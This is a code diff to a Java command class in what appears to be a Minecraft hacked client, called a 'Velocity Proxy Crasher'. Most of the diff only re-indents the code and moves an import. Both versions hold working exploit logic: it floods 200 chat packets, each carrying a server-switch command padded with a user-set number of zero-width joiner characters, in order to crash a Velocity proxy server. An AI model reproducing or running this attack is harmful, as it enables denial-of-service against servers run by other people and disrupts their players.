@@ -6,10 +6,10 @@ import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import com.mojang.brigadier.builder.RequiredArgumentBuilder;
 import com.mojang.brigadier.context.CommandContext;
 import net.paradise_client.command.Command;
-import net.minecraft.text.Text;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
 import net.minecraft.command.CommandSource;
+import net.minecraft.text.Text;
 
 /**
  * Command: Velocity Proxy Crasher
@@ -43,30 +43,38 @@ public class VelocityCrasherCommand extends Command {
      * Executes the exploit logic
      */
     private int executeAttack(CommandContext<CommandSource> ctx) {
-    Runnable task = () -> {
-        if (this.getMinecraftClient().player == null
-                || this.getMinecraftClient().getNetworkHandler() == null) {
-            return;
-        }
+        Runnable task = () -> {
+            if (this.getMinecraftClient().player == null
+                    || this.getMinecraftClient().getNetworkHandler() == null) {
+                return;
+            }
 
-        ClientPlayNetworkHandler net = this.getMinecraftClient().getNetworkHandler();
-        String server = ctx.getArgument("server", String.class);
-        int power = ctx.getArgument("power", Integer.class);
+            ClientPlayNetworkHandler net = this.getMinecraftClient().getNetworkHandler();
+            String server = ctx.getArgument("server", String.class);
+            int power = ctx.getArgument("power", Integer.class);
 
-        String filler = "\u200d"; // Zero-width joiner
-        Text message = Text.literal("server " + server + " " + filler.repeat(power));
+            String filler = "\u200d"; // Zero-width joiner
+            Text message = Text.literal("server " + server + " " + filler.repeat(power));
 
-        for (int i = 0; i < 200; i++) {
-            net.sendPacket(new ChatMessageC2SPacket(message));
-        }
+            for (int i = 0; i < 200; i++) {
+                net.sendPacket(new ChatMessageC2SPacket(message));
+            }
 
-        try {
-            Thread.sleep(50L);
-        } catch (InterruptedException ie) {
-            Thread.currentThread().interrupt();
-        }
-    };
+            try {
+                Thread.sleep(50L);
+            } catch (InterruptedException ie) {
+                Thread.currentThread().interrupt();
+            }
+        };
 
-    new Thread(task, "VelocityCrasher").start();
-    return 1;
+        new Thread(task, "VelocityCrasher").start();
+        return 1;
+    }
+
+    /**
+     * Default execution if no arguments provided
+     */
+    private int executeDefault(CommandContext<CommandSource> ctx) {
+        return 1;
+    }
 }
